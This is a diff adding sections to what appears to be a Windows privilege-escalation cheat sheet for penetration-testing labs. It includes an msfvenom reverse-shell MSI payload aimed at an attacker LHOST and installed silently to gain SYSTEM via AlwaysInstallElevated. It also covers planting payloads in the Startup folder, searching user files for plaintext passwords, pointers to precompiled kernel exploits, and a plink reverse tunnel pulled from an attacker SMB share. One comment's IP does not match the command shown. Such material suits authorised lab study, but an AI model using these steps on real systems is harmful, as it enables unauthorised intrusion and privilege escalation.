@@ -88,11 +88,14 @@ accesschk.exe -uwcqv "Authenticated Users" *
 accesschk.exe -uwcqv "Everyone" *
 
 #Check our permissions for one specific service
-accesschk.exe -ucqv daclsvc 
+accesschk.exe -ucqv daclsvc
 
-#Check under what privileges a system runs 
-sc qc daclsvc 
+#Check under what privileges a system runs
+sc qc daclsvc
 ```
+
+Exploit - Always used a public exploit and never waste time compiling your own kernel exploits. You can find a list of precompiled exploits here:   
+- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)    
 
 # Services
 ## BinPath
@@ -101,15 +104,79 @@ sc qc daclsvc
 ## Executable File
 ## DLL Hijacking
 # Password mining
+Administrators are often lazy and use weak passwords or reuse them. When performing our password mining, we scout for (hashed) passwords that administrators maybe reused for their main account. Further these passwords could also get us access to other services like databases.   
+#### Passwords stored by user
+Sometimes users store their passwords in plain-text in an unsecured file. When we can find these passwords, it is a quick win for us.   
+```
+# Check for files in home folders of users with names that could mean they hold passwords
+dir /s C:\Users
+```   
+
 ## Passwords stored by user
 ## Registry
 ## Configuration Files
 # Registry
 ## AutoRun
 ## AllwaysInstallElevated
+When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have ** system **.    
+#### detect vulnerability:   
+```
+# check if AlwaysInstallElevated key is set
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```   
+##### Exploit
+```
+# Generate payload
+msfvenom -p windows/reverse_shell_tcp LHOST=<ip attack> LPORT=<port> -f msi > shell.msi
+
+# Install msi file
+msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
+```    
+
 # Scheduled Tasks
 # Hot Potato
 ## Detect
 ## Exploit
 # Startup Aplications
+##### Detect if vulnerable:
+```
+#Check if you have write permissions to startup folder
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```   
+#### Exploit:
+- Generate payload and place it in this folder.    
+- restart the machine with Administrator credentials.   
+
 # Firewalled Services
+Some machines firewall several ports such that they are only accessible from the localhost. If we can execute code through services that are running as system, we can elevate our privileges to system.   
+##### Detect for vulnerable services:
+```
+# Check what interfaces are only available to the localhost (compare to your nmap scan)
+netstat -ano
+
+# Check the executable from a specific service
+tasklist /fi "pid eq <PID>"
+```   
+##### Exploit
+For databases, you can gain RCE through the command functionality or find passwords in the database itself.   
+
+When dealing with web apps that are only accessible to the localhost, we can forward them to our kali machine:
+```
+# On machine attack // example 10.10.10.12
+# Start the SSH service
+service ssh start
+
+#place the plink.exe binary in the smb shared folder
+# On the target
+# Tunnel the traffic
+//10.10.10.12/share/plink.exe root@10.10.10.12 -R 4000:127.0.0.1:80
+
+# Here 10.11.0.79 is ip of machine attack
+# 4000 is local port on kali to bind web app to
+# 80 is local port on target that we want to forward
+
+#on kali
+# Go in the browser to following url and you should see the forwarded web app
+http://localhost:4000    
+```   
